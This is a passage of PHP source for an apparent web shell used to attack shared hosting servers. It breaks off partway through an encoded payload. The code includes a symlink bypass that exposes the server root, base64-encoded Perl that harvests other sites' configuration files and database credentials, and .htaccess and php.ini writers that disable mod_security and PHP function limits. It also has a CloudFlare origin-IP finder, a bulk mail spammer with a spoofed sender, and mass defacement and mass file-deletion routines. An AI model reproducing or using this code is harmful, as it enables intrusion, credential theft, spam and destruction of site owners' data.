vc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICI8YnI+PGJyPjxicj48Zm9udCBjb2xvcj1yZWQ+RG9uZSAhISA8aW1nIHNyYz0naHR0cDovL2kuaW1ndXIuY29tL0x0dWtFSk4ucG5nJyAgaGVpZ2h0PSc3MCcgd2lkdGg9JzYwJz48L2ZvbnQ+IjsNCg==';
$file = fopen("xaivhost.cin","w+");
$write = fwrite($file,base64_decode($xaivhost));
fclose($file);
chmod("xaivhost.cin", 0755);
echo "<center><a href='xaivhost' target='_blank'><font color='lime'>>> XaiVhosts <<</font></a></center>";
}}
elseif($_GET['do'] == 'phpinfo') {
@ob_start();@eval("phpinfo();");$buff = @ob_get_contents();@ob_end_clean();$awal = strpos($buff,"<body>")+6;$akhir = strpos($buff,"</body>");echo "<div class='mybox'><div class='phpinfo'>".substr($buff,$awal,$akhir-$awal)."</div></div>";
} 
elseif($_GET['bypass'] == 'cloudfl') {
echo '<form method="post">
<center>
<h3>Bypass CloudFlare</h3>
<select class="inputz" name="krz">
<option>ftp</option>
<option>direct-connect</option>
<option>webmail</option>
<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass!"></center>';
$target = $_POST['target'];
    # Bypass From FTP
    if ($_POST['krz'] == "ftp") {
        $ftp = gethostbyname("ftp." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$ftp</font></p>";
    }
    # Bypass From Direct-Connect
    if ($_POST['krz'] == "direct-connect") {
        $direct = gethostbyname("direct-connect." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$direct</font></p>";
    }
    # Bypass From Webmail
    if ($_POST['krz'] == "webmail") {
        $web = gethostbyname("webmail." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$web</font></p>";
    }
    # Bypass From Cpanel
    if ($_POST['krz'] == "cpanel") {
        $cpanel = gethostbyname("cpanel." . "$target");
        echo "<br><p align='center' dir='ltr'>
        <font color='white'>CORRECT IP IS: </font>
        <font color='lime'>$cpanel</font></p>";
    }
}
elseif($_GET['bypass'] == 'vhosts'){
	echo "<form method='post' action=''>";
	echo "<center><h3>Bypass Symlink vHost</h3>";
	echo "<input type='submit' value='Bypass!' name='jembut'>";
		if (isset($_POST['jembut'])){
                        mkdir('symvhosts', 0755);
                        chdir('symvhosts');
                        system('ln -s / kuda.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBrdWRhLmh0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgdHh0IC5waHA=';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","kuda.txt");
			$rt="<a href='symvhosts/kuda.txt' target='_blank'><font color='lime'>Bypassed Successfully!</font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br><br>$rt<br>Note: Kalo Forbidden pas ngebuka /var/www/vhosts/domain.com/ harap tambahkan httpdocs ex:/var/www/vhosts/domain.com/httpdocs/</center>";} echo "</form>";
}
elseif($_GET['bypass'] == 'disablefunc'){
		echo "<center><h3>Bypass Disable Functions</h3>";
		echo "<form method='post'><input type='submit' name='ini' value='php.ini'>&nbsp;<input type='submit' name='htce' value='.htaccess'>&nbsp;<input type='submit' name='litini' value='Litespeed'></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"safe_mode = OFF\ndisable_functions = NONE");
		fclose($file);
		echo " <a href='php.ini' target='_blank'>Click Here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
		fclose($file);
		echo " htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = "PD9waHANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXTsNCj8+";
		$byph = "c2FmZV9tb2RlID0gT0ZGXG5kaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkU=";
		$comp = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPlxuU2VjRmlsdGVyRW5naW5lIE9mZlxuU2VjRmlsdGVyU2NhblBPU1QgT2ZmXG48L0lmTW9kdWxlPg==";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
}
elseif($_GET['do'] == 'spam_mail'){
if(isset($_POST['oksend']) AND !empty($_POST['fremail']) AND !empty($_POST['tremail']) AND !empty($_POST['subjectt']) AND !empty($_POST['msgmail']) AND !empty($_POST['ctmail']) AND !empty($_POST['frname']) AND is_numeric($_POST['ctmail'])){
$FromEmail = $_POST['fremail'];
$TargetEmail = $_POST['tremail'];
$Subject = $_POST['subjectt'];
$Message = $_POST['msgmail'];
$Count = $_POST['ctmail'];
if(isset($_POST['htmlcontents'])){
$headers = "From: ".$_POST['frname']." <".$FromEmail.">rn";
$headers .= "MIME-Version: 1.0rn";
$headers .= "Content-Type: text/html; charset=ISO-8859-1rn";
$linenterr = '<br/>-<br/>';
}else{
$headers = "From: ".$_POST['frname']." <".$FromEmail.">";
$linenterr = '
-
';
}
$i=1;
while($i <= $Count){
if($Count==1){
$Subjectz = $Subject;
$Messagez = $Message;
}else{
$Subjectz = $Subject.' - '.$i;
$Messagez = $Message.$linenterr.$i;
}
if(mail($TargetEmail, $Subjectz, $Messagez, $headers)){
echo '<center><font color="lime">'.$i.' - Success Cok!</font></center><br>';
}else{
echo '<center><font color="red">'.$i.' - Failed Cok!</font></center><br>';
}
$i=$i+1;
}
}else{
echo '<form method="post">
<center><h3>Mail Spammer</h3>
<p>Gunakan Email Pengirim Yang Asli Agar Pesan Tidak Dianggap Spam</p><br/>
Sender Email:<br/>
<input type="email" size="40" name="fremail" placeholder="kuda@email.com" value="'.htmlspecialchars($_POST['fremail']).'"><br/><br/>
Sender Name:<br/>
<input type="text" size="40" name="frname" placeholder="Unknown" value="'.htmlspecialchars($_POST['frname']).'"><br/><br/>
Target Email:<br/>
<input type="email" size="40" name="tremail" placeholder="to@email.com" value="'.htmlspecialchars($_POST['tremail']).'"><br/><br/>
Subject:<br/>
<input type="text" size="40" name="subjectt" placeholder="Maqlo Heker.." value="'.htmlspecialchars($_POST['subjectt']).'"><br/><br/>
Message:<br/>
<textarea cols="30" rows="8" name="msgmail" placeholder="Ah jembut lu!">'.htmlspecialchars($_POST['msgmail']).'</textarea><br/><br/>
Spam Count:<br/>
<input type="number" size="40" name="ctmail" placeholder="10" value="'.htmlspecialchars($_POST['ctmail']).'"><br/><br/>
<input type="checkbox" name="htmlcontents" value="HTML Contents">HTML Contents:<br/><br/>
<input type="submit" name="oksend" value="Send!"></form></center>';
}
}
elseif($_GET['do'] == 'mass_deface') {
	echo "<form action='' method='post'>";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<center><span style='color:lime;'><strong> [+] Nyabun 100% Successfull </strong></span></center><br>";
		} 
		else {
			echo "<center><span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span></center><br>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:white;' name='index' rows='10' cols='67'>\n";
        $ini="http://";
        $mainpath=$_POST[d_dir];
        $file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){
        $start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){
            echo"$ini$row/$file\n";
            }
        }
        echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
        $mainpath=$_POST[d_dir];$file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){echo '<a href="http://'.$row .'/'.$file.'" target="_blank">http://'.$row.'/'.$file.'</a><br>'; }
        }

    }
	elseif($_POST['mass'] == 'sabunmassal') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	
		echo "</div>"; }
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunmassal\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		Folder:<br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		Filename:<br>
		<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
		Index File:<br>
		<textarea name='script' style='width: 450px; height: 200px;'>Visited By Mr.xBarakuda</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></font></center>";
		}
}
elseif($_GET['do'] == 'config') {
    $idx = mkdir("kuda_config", 0777);
    $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
    $htc = fopen("kuda_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    fclose($htc);
    if(preg_match("/vhosts|vhost/", $dir)) {
        $link_config = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        $vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpvcGVuZGlyKG15ICRkaXIgLCAiL3Zhci93d3cvdmhvc3RzLyIpOw0KZm9yZWFjaChzb3J0IHJlYWRkaXIgJGRpcikgew0KICAgIG15ICRpc0RpciA9IDA7DQogICAgJGlzRGlyID0gMSBpZiAtZCAkXzsNCiRzaXRlc3MgPSAkXzsNCg0KDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3MvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atb3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibH